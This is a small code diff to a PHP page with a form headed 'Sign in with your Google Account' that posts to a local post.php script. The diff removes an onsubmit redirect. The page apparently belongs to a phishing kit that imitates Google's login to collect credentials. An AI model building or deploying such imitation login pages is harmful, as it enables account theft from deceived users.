@@ -26,7 +26,7 @@ require_once('helper.php');
 
 </head>
 <body>
-<form method="POST" action="post.php" onsubmit="redirect()">
+<form method="POST" action="post.php">
 	<img src="assets/img/1ckkcu79ho.gif" alt="">
 	<h1>Sign in</h1>
 	<h2>with your Google Account</h2>
